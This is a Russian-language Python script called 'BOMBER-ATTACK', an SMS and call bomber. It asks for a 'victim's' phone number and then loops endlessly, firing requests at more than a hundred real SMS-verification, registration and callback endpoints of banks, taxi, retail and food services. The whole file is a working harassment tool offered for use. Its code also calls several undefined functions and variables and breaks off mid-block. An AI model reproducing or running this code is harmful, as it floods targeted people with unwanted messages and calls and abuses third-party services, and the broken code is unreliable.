import os, sys, time, requests, random
print('Запуск программы... Пожалуйста подождите..')
time.sleep(5)
os.system('python -m pip install pip')
os.system('pip install requests')
print("""
    """)

print("""
    """)

print("""
    """)

print("""
    """)
#АВТОР - uw935
#Если увидели ЛЯП - пишите @uw935
board = ("""
┌─────────────────────────────────────────────┐
│                BOMBER-ATTACK                │
├─────────────────────────────────────────────┤
│                Обновление:                  │
│          [+] Добавлено больше ресурсов      │
│          [+] Изменено оформление            │
│          [+] Более 100+ ресурсов!           │
│─────────────────────────────────────────────│   
│               Версия - 0.1.0                │ 
│─────────────────────────────────────────────│   
│  Техническая поддержка: https://t.me/uw935  │  
├─────────────────────────────────────────────┤
│      Автор: https://github.com/UW935        │
└─────────────────────────────────────────────┘
""")
print(board)
_name = ""
_phone9 = ""
newk = 0
phone = ""
try:
    phone = sys.argv[1]
except:
    print("""
Добро пожаловать в BOMBER ATTACK.
Автор - @uw935.
Технические вопросы - @uw935 (телеграмм).
""")
    
#Номер телефона
    print("ПОМЕТКА: укажите только цифры, что бы не было ошибок. Например: 79166575")
    phone = input("Укажите номер: ")
    
#Начало СПАМ АТАКИ
_phone = phone
np = "\033[37m\033[47m_\033[0m"
np2 = "\033[47m_____\033[30m                         \033[0m\033[44m\033[34m_ \033[0m"
start = """
Что бы начать СПАМ-АТАКУ нажмите 'enter'."""
print(start)
input() #задержка

print("""Что бы остановить БОМБЕР - закройте приложение. """)
print("Номер жертвы: " + phone)

#print("""
#    Подготовка...""")
#time.sleep(5)
#print("""
#    Подготовка...""")
#time.sleep(5)
#print("""
#    Готово!
#    """)
#time.sleep(2)
#print("""Немного подождите..
#    """)
#time.sleep(10)

#CODE
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
s = 0
iteration = 0

while True:
    _email = _name+f'{iteration}'+'@gmail.com'
    email = _name+f'{iteration}'+'@gmail.com'
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonemas,"email":"","city":""})
        print("[+] 1 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone})
        print("[+] 2 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone[1:], maska="8(###)###-##-##")
        requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonemas})
        print("[+] 3 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone})
        print("[+] 4 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": phonemas, "code":""})
        print("[+] 5 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone})
        print("[+] 6 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone})
        print("[+] 7 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone})
        print("[+] 8 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""})
        print("[+] 9 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
        print("[+] 10 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) })
        requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"})
        print("[+] 11 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="#(###)###-##-##")
        requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonemas})

        phonemas=mask(str=phone, maska="+#(###)###-##-##")
        requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"})
        print("[+] 12 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone},)
        print("[+] 13 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone})
        print("[+] 14 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"})
        print("[+] 15 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonemas})
        print("[+] 16 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="8(###)###-##-##")
        requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonemas})
        print("[+] 17 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone})
        print("[+] 18 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}})
        print("[+] 19 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone})
        print("[+] 20 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"},)
        print("[+] 21 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(phone, maska="+# (###) ### - ## - ##")
        requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone})
        print("[+] 22 - отправлен")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone})
        print("[+] 23 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="(+#)##########")
        requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phonemas, "type": 1}})
        print("[+] 24 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone})
        print("[+] 25 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone,})
        print("[+] 26 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name},)
        print("[+] 27 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone})
        print("[+] 28 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone9, maska="8(###)###-##-##")
        requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phonemas})
        print("[+] 29 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone9, maska="8 (###) ###-##-##")
        requests.post("http://sushigourmet.ru/auth",data={"phone": phonemas, "stage": 1})
        print("[+] 30 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone})
        print("[+] 31 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0})
        print("[+] 32 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone},)
        print("[+] 33 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone,},)
        print("[+] 34 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone9, maska="8-###-###-##-##")
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+phone}, headers={})
        print("[+] 35 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
        print("[+] 36 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonemas})
        print("[+] 37 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"})
        print("[+] 38 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"})
        print("[+] 39 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0})
        print("[+] 40 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",})
        print("[+] 41 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"})
        print("[+] 42 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone})
        print("[+] 43 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login":phone9,"check":True,"crypto":{"captcha":"739699"}}})
        print("[+] 44 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": "+"+phone})
        print("[+] 45 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"},)
        print("[+] 46 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0},)
        print("[+] 47 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": "+"+phone})
        print("[+] 48 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+#(###)###-##-##")
        requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": phonemas, "alien": "0"})
        print("[+] 49 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": phone})
        print("[+] 50 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})
        print("[+] 51 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))})
        print("[+] 52 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": "+"+phone, "mode": "sms"})
        print("[+] 53 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+#-###-###-##-##")
        requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": phonemas}})
        print("[+] 54 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": phonemas})
        print("[+] 56 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": phonemas})
        print("[+] 57 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone})
        print("[+] 58 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone9, maska="8-###-###-##-##")
        requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","name": name,"phone": phonemas})
        print("[+] 59 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9})
        print("[+] 60 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+phone, "method": "sendCode"})
        print("[+] 61 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-####")
        requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": phonemas})
        print("[+] 62 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+"+phone},)
        print("[+] 63 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+#-###-###-##-##")
        requests.post("https://paylate.ru/registry",data={"mobile": phonemas,"first_name": name,"last_name": name,"nick_name": name,"gender-client": 1,"email": email,"action": "registry"})
        print("[+] 64 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8"+phone9})
        print("[+] 65 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0})
        print("[+] 66 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-####")
        requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": "Auth.SendPassword","params[0]": phonemas})
        print("[+] 67 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]})
        print("[+] 68 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone})
        print("[+] 69 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post(
            "https://www.ollis.ru/gql",
            json={{"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}})
        print("[+] 70 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone9, maska="8 (###) ###-##-##")
        requests.get("https://okeansushi.ru/includes/contact.php",params={"call_mail": "1","ajax": "1","name": name,"phone": phonemas,"call_time": "1","pravila2": "on"})
        print("[+] 71 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone})
        print("[+] 72 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone})
        print("[+] 73 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": phone,"registration": "N"})
        print("[+] 74 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.niyama.ru/ajax/sendSMS.php",data={"REGISTER[PERSONAL_PHONE]": phone,"code": "","sendsms": "Выслать код"})
        print("[+] 75 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone})
        print("[+] 76 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://auth.multiplex.ua/login", json={"login": phone})
        print("[+] 77 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone})
        print("[+] 78 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": phone,"email": email})
        print("[+] 79 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",data={"name": name, "phone": phone})
        print("[+] 80 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+phone},)
        print("[+] 81 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code",data="+"+phone)
        print("[+] 82 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": name, "CellPhone": phone, "Package": "optimal"})
        print("[+] 83 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+"+phone,"klient_email": email})
        print("[+] 84 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ### ## ##")
        requests.get(f"http://mnogomenu.ru/office/password/reset/"+phonemas)
        print("[+] 85 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://my.mistercash.ua/ru/send/sms/registration",params={"number": "+"+phone})
        print("[+] 86 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://menza-cafe.ru/system/call_me.php",params={"fio": name, "phone": phone, "phone_number": "1"})
        print("[+] 87 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password})
        print("[+] 88 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": phone, "do": "phone"})
        print("[+] 89 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# ### ### ## ##")
        requests.get("https://makimaki.ru/system/callback.php",params={"cb_fio": name,"cb_phone": phonemas})
        print("[+] 90 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": phone, "metod": "postreg"})
        print("[+] 91 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": phone},headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
        print("[+] 92 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone})
        print("[+] 93 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",json={"url": "/api/client/phone_verification","method": "POST","data": {"client_id": 5646981, "phone": phone, "alisa_id": 1},"headers": {"Client-Id": 5646981,"Content-Type": "application/x-www-form-urlencoded"}})
        print("[+] 94 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+"+phone})
        print("[+] 95 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": phone})
        print("[+] 96 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone":phone, "Type": 1})
        print("[+] 97 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="# (###) ###-##-##")
        requests.post("https://kilovkusa.ru/ajax.php",params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"},data={"phone": phonemas })
        print("[+] 98 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+"+phone})
        print("[+] 99 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9})
        print("[+] 100 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone})
        print("[+] 101 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://izi.ua/api/auth/register",json={"phone": "+"+phone,"name": name,"is_terms_accepted": True})
        print("[+] 102 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+"+phone})
        print("[+] 103 - отправлен.")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": phone})
        print('[+] 104 - отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
        print('[+] 105 - отправлено!')
    except:
        print('[-] Не отправлено!')

    print("Небольшая остановка...") 
    time.sleep(10)

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+phone}, headers={})
        print('[+] 106 - отправлено!')
    except:
        print('[-] Не отправлено!')
    try:
        requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": phone})
        print("[+] 107 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
        print("[+] 108 - отправлен0!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone})
        print("[+] 109 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": password,"application": "lkp","login": "+"+phone})
        print("[+] 110 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999),"DocSeries": randint(5000, 9999),"FirstName": name,"Gender": "M","LastName": name,"SecondName": name,"Phone": phone9,"Email": email})
        print("[+] 111 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",data={"country": "RU","csrfmiddlewaretoken": "","phone": phone})
        print("[+] 112 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+"+phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown"})
        print("[+] 113 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": phone, "region_code": "RU"})
        print("[+] 114 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
        print("[+] 115 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
        print("[+] 116 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": phone, "platform": "PISWeb"})
        print("[+] 117 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": phone,"REGISTER[PERSONAL_PHONE]": phone,"REGISTER[SMS_CODE]": "","resend-sms": "1","REGISTER[EMAIL]": "","register_submit_button": "Зарегистрироваться"})
        print("[+] 118 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone9}},)
        print("[+] 119 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"})
        print("[+] 120 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://friendsclub.ru/assets/components/pl/connector.php",data={"casePar": "authSendsms", "MobilePhone": "+"+phone})
        print("[+] 121 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://foodband.ru/api?call=calls",data={"customerName": name,"phone": phonemas,"g-recaptcha-response": ""})
        print("[+] 122 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://foodband.ru/api/",params={"call": "customers/sendVerificationCode","phone": phone9,"g-recaptcha-response": ""})
        print("[+] 123 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.flipkart.com/api/5/user/otp/generate",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": "+"+phone})
        print("[+] 124 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
